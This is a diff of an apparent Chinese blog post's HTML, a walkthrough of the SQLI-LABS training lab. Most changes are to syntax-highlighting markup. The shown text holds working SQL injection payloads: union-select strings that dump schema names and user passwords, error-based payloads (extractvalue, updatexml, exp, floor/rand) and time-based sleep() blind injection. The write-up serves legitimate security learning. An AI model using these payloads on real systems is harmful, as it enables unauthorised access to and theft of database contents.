@@ -457,17 +457,17 @@
 
       
         <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>寒假无聊，加上最近也正好在学习数据库，所以顺便做一下sql注入天书SQLI-LABS，安装的话网上有很多的教程，按照教程的步骤做就可以。<br><a id="more"></a></p>
-<h1 id="系统数据库"><a href="#系统数据库" class="headerlink" title="系统数据库"></a>系统数据库</h1><p>我们先使用一下系统数据库<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">use</span> <span class="title">information_schema</span>;</span><br></pre></td></tr></table></figure></p>
+<h1 id="系统数据库"><a href="#系统数据库" class="headerlink" title="系统数据库"></a>系统数据库</h1><p>我们先使用一下系统数据库<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use information_schema;</span><br></pre></td></tr></table></figure></p>
 <p><img src="/2018/02/04/sqli-labs1/1.png" alt=""></p>
-<p>使用一下这个查询<br><figure class="highlight q"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.<span class="built_in">tables</span> <span class="built_in">where</span> table_schema = <span class="string">"security"</span>;</span><br></pre></td></tr></table></figure></p>
+<p>使用一下这个查询<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select table_name from information_schema.tables where table_schema = &quot;security&quot;;</span><br></pre></td></tr></table></figure></p>
 <p>这样的话可以得到表名列表</p>
 <p>所以可以利用<code>information_schema</code> 进行一次完整的注入，以下为一般流程：</p>
-<p>猜数据库<br><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> schema_name <span class="keyword">from</span> information_schemata;</span><br></pre></td></tr></table></figure></p>
+<p>猜数据库<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select schema_name from information_schemata;</span><br></pre></td></tr></table></figure></p>
 <p>猜某库的数据表</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> table_name <span class="keyword">from</span> information.tables <span class="keyword">where</span> table_schema=<span class="string">'xxx'</span>;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select table_name from information.tables where table_schema=&apos;xxx&apos;;</span><br></pre></td></tr></table></figure>
 <p>猜表的所有列</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="string">'xxx'</span>;</span><br></pre></td></tr></table></figure>
-<p>查找某列的内容<br><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> *** <span class="keyword">from</span> ***;</span><br></pre></td></tr></table></figure></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select column_name from information_schema.columns where table_name=&apos;xxx&apos;;</span><br></pre></td></tr></table></figure>
+<p>查找某列的内容<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select *** from ***;</span><br></pre></td></tr></table></figure></p>
 <hr>
 <h1 id="LESS-1"><a href="#LESS-1" class="headerlink" title="LESS-1"></a>LESS-1</h1><p>这是我的第一关，所以要详细一点。<br>打开界面</p>
 <blockquote>
@@ -478,11 +478,11 @@
 <p>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ‘’1’’ LIMIT 0,1’ at line 1</p>
 </blockquote>
 <p>发现是单引号未闭合，输入<code>?id=1’—+</code> 即可正常回显，接下来是爆字段</p>
-<figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">1</span>' or <span class="number">1</span>=<span class="number">1</span> order by <span class="number">1</span>,<span class="number">2</span>--+</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos; or 1=1 order by 1,2--+</span><br></pre></td></tr></table></figure>
 <p>不断增加 <em>order by</em> 后面的数字，直到报错，到了4的时候报错，说明该表有三个字段。接下来使用union查询</p>
-<figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">-1</span>' union select <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>--+</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&apos; union select 1,2,3--+</span><br></pre></td></tr></table></figure>
 <p>这个<code>1,2,3</code> 只是为了保证 <em>union</em> 前后两个语句的列数相同，至于<code>id=-1</code> 则是为了使前一个查询无返回结果从而返回第二个 <em>select</em> 的查询结果。只需要将数字替换为相应的想要查询的信息即可，比如：</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1' union <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">database</span>(),<span class="keyword">user</span>()<span class="comment">--+</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&apos; union select 1,database(),user()--+</span><br></pre></td></tr></table></figure>
 <p>这样可以得到函数名，数据库名等信息。</p>
 <p>这里列举几个常用的函数：</p>
 <p><strong><em>系统函数：</em></strong></p>
@@ -493,18 +493,18 @@
 <blockquote>
 <p><strong>concat(str1,str2,…)：</strong> 没有分隔符地连接字符串<br><strong>concat_ws(sep,str1,str2,…)：</strong> 含有分隔符的连接字符串，sep为分隔符，由ASCII码指定<br><strong>group_concat(str1,str2,…)：</strong> 连接一个组的所有字符串，中间以逗号隔开。</p>
 </blockquote>
-<p>利用系统数据库爆库名：<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1'union <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">group_concat</span>(schema_name),<span class="number">2</span> <span class="keyword">from</span> information_schema.schemata <span class="comment">--+</span></span><br></pre></td></tr></table></figure></p>
-<p>爆表名<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1'union <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">group_concat</span>(table_name),<span class="number">2</span> <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="string">'security'</span> <span class="comment">--+</span></span><br></pre></td></tr></table></figure></p>
+<p>利用系统数据库爆库名：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&apos;union select 1,group_concat(schema_name),2 from information_schema.schemata --+</span><br></pre></td></tr></table></figure></p>
+<p>爆表名<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&apos;union select 1,group_concat(table_name),2 from information_schema.tables where table_schema=&apos;security&apos; --+</span><br></pre></td></tr></table></figure></p>
 <p>爆列名</p>
-<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="attribute">id</span>=-1'union select 1,group_concat(column_name),3 <span class="keyword">from</span> information_schema.columns where <span class="attribute">table_name</span>=<span class="string">'users'</span>--+</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&apos;union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&apos;users&apos;--+</span><br></pre></td></tr></table></figure>
 <p>爆数据</p>
-<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="attribute">id</span>=-1'union select 1,username,password <span class="keyword">from</span><span class="built_in"> users </span>where <span class="attribute">id</span>=3--+</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&apos;union select 1,username,password from users where id=3--+</span><br></pre></td></tr></table></figure>
 <h1 id="LESS-2"><a href="#LESS-2" class="headerlink" title="LESS-2"></a>LESS-2</h1><p>尝试<code>?id=1’</code> 报错</p>
 <blockquote>
 <p>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ‘’ LIMIT 0,1’ at line 1</p>
 </blockquote>
 <p>发现是单引号出现了奇数次，查看源代码</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql="<span class="keyword">SELECT</span> * <span class="keyword">FROM</span> <span class="keyword">users</span> <span class="keyword">WHERE</span> <span class="keyword">id</span>=$<span class="keyword">id</span> <span class="keyword">LIMIT</span> <span class="number">0</span>,<span class="number">1</span><span class="string">"</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql=&quot;SELECT * FROM users WHERE id=$id LIMIT 0,1&quot;</span><br></pre></td></tr></table></figure>
 <p>是直接传递变量，所以直接传参数即可<code>?id=-1 union select 1,database(),version()</code></p>
 <p>接下来过程与第一个一样。</p>
 <h1 id="LESS-3"><a href="#LESS-3" class="headerlink" title="LESS-3"></a>LESS-3</h1><p>尝试<code>?id=1’</code>，得到报错信息：</p>
@@ -548,7 +548,7 @@
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">count</span>(*) <span class="keyword">from</span> (<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="literal">null</span> <span class="keyword">union</span> <span class="keyword">select</span> !<span class="number">1</span>) <span class="keyword">group</span> <span class="keyword">by</span> <span class="keyword">concat</span>(<span class="keyword">version</span>(),<span class="keyword">floor</span>(<span class="keyword">rand</span>(<span class="number">0</span>)*<span class="number">2</span>))</span><br></pre></td></tr></table></figure>
 <p>如果rand被禁用了可以使用用户变量来报错</p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">min</span>(@a:=<span class="number">1</span>) <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> <span class="keyword">concat</span>(<span class="keyword">password</span>,@a:=(@a+<span class="number">1</span>)%<span class="number">2</span>)</span><br></pre></td></tr></table></figure>
-<h3 id="2、exp"><a href="#2、exp" class="headerlink" title="2、exp()"></a>2、exp()</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">exp</span>(~(<span class="keyword">select</span> * <span class="keyword">from</span> (<span class="keyword">select</span> <span class="keyword">user</span>())a))  //<span class="keyword">double</span>数值类型超出范围</span><br></pre></td></tr></table></figure>
+<h3 id="2、exp"><a href="#2、exp" class="headerlink" title="2、exp()"></a>2、exp()</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select exp(~(select * from (select user())a))  //double数值类型超出范围</span><br></pre></td></tr></table></figure>
 <blockquote>
 <p><code>exp()</code> 函数为以e为底的对数函数，版本在5.5.5及其之上，本例利用了exp报错</p>
 </blockquote>
@@ -556,7 +556,7 @@
 <blockquote>
 <p><code>bigint</code>类型超出范围，<code>~0</code> 是对0按位取反。</p>
 </blockquote>
-<h3 id="4、-xpath"><a href="#4、-xpath" class="headerlink" title="4、 xpath"></a>4、 xpath</h3><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">extractvalue</span>(<span class="number">1</span>,concat(<span class="number">0</span>x7a,(select <span class="variable">@@version</span>),<span class="number">0</span>x7e)) <span class="comment">//MySQL对XML数据进行修改的xpath函数，xpath语法错误。</span></span><br></pre></td></tr></table></figure>
+<h3 id="4、-xpath"><a href="#4、-xpath" class="headerlink" title="4、 xpath"></a>4、 xpath</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">extractvalue(1,concat(0x7a,(select @@version),0x7e)) //MySQL对XML数据进行修改的xpath函数，xpath语法错误。</span><br></pre></td></tr></table></figure>
 <h3 id="5、xpath"><a href="#5、xpath" class="headerlink" title="5、xpath"></a>5、xpath</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">updatexml(1,concat(0x7e,(<span class="keyword">select</span> @@<span class="keyword">version</span>),<span class="number">0x7e</span>),<span class="number">1</span>) //与第<span class="number">4</span>个相同原理</span><br></pre></td></tr></table></figure>
 <h3 id="6、重复特性"><a href="#6、重复特性" class="headerlink" title="6、重复特性"></a>6、重复特性</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> (<span class="keyword">select</span> <span class="keyword">NAME_CONST</span>(<span class="keyword">version</span>(),<span class="number">1</span>),<span class="keyword">NAME_CONST</span>(<span class="keyword">version</span>(),<span class="number">1</span>))x; //mysql重复特性，此处重复了version，所以报错。</span><br></pre></td></tr></table></figure>
 <h2 id="基于时间的SQL盲注"><a href="#基于时间的SQL盲注" class="headerlink" title="基于时间的SQL盲注"></a>基于时间的SQL盲注</h2><h3 id="1、sleep-函数"><a href="#1、sleep-函数" class="headerlink" title="1、sleep()函数"></a>1、sleep()函数</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">If(ascii(substr(database(),1,1))&gt;115,0,sleep(5))# //if判断语句，条件为假，执行sleep</span><br></pre></td></tr></table></figure>
@@ -831,7 +831,7 @@
                 
                   <a href="/archives">
                 
-                    <span class="site-state-item-count">32</span>
+                    <span class="site-state-item-count">33</span>
                     <span class="site-state-item-name">posts</span>
                   </a>
                 </div>
@@ -899,7 +899,9 @@
                     
                       
                     
-                    <span class="site-state-item-count">13</span>
+                      
+                    
+                    <span class="site-state-item-count">14</span>
                     <span class="site-state-item-name">tags</span>
                   </a>
                 </div>
